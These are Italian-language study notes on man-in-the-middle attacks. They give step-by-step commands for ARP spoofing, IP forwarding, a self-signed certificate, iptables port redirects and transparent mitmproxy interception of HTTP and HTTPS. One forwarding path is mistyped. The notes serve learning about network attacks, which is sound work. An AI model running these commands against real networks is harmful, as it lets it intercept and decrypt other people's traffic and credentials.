#CyberSecurity 

# **Cos'è un MITM?**
>E' un attacco che permette all'attaccante di sniffare i pacchetti in transito tra il server e il client fingendosi parte della rete.

![[MITM.png]]

>MITM con arpspoof:
```shell
nmap -sn SUBNET

# Una volta trovato l'IP della vittima occorre abilitare il forwarding degli IP dei pacchetti (reinderizzare pacchetti che non sono nostri)

echo 1 | sudo tee /proc/sys/net/ipv4/ipforward 
# oppure mettendo
sysctl -w net.ipv4.ip_forward=1

# Ora dobbiamo convincere il client ed il server che siamo il server per il client e che siamo il client per il server

sudo arpspoof -i eth0 -t IP-CLIENT IP-SERVER
sudo arpspoof -i eth0 -t IP-SERVER IP-CLIENT

# -i: specifica l'interfaccia di rete
# -t: 

# Successivamente possiamo analizzare la rete
sudo tcpdump -i eth0 -n host IP-CLIENT and host IP-SERVER
```

## **Ci si può rendere conto di questo verificando i certificati**

---

# **MITM con certificati**

1. Abilitare IP-Forwarding
```shell
sudo sysctl -w net.ipv4.ip_forward=1
```
2. Creazione dei certificati
```shell
openssl req -newkey rsa:2048 \
	-nodes \
	-keyout legit.key \
	-x509 \
	-days 365 \
	-out legit.crt \
	-subj "/CN=server-legittimo"   
	
#Per mitmproxy unire la chiave ed il certificato sotto un unico file:
# Unisci chiave e certificato in un unico file PEM
cat legit.key legit.crt > my-cert.pem
```
3. Arpspoofing, convincere client e server
```shell
sudo arpspoof -i eth0 -t <IP_CLIENT> <IP_SERVER>
sudo arpspoof -i eth0 -t <IP_SERVER> <IP_CLIENT>   
```
4. IpTables. quando il pacchetto arriva lo intercetta e lo sposta sulla porta specificata
```shell
# HTTP
sudo iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 \
-j REDIRECT --to-port 8080

#HTTPS
sudo iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 \
-j REDIRECT --to-port 8080   
```
5. MitmProxy (oppure BurpSuite) con certificati per farsi credere il destinatario originale, decifra il contenuto e poi lo richiude per mandarlo al server
```shell
mitmproxy --mode transparent --showhost --certs *=my-cert.pem -p 8080  
```

## **Una volta finito lo sniffing pulire le regole di iptables e disabilitare l'Ip forwarding**
```shell
# Svuota tutte le regole NAT
sudo iptables -t nat -F
# Disabilita il forwarding
sudo sysctl -w net.ipv4.ip_forward=0
```
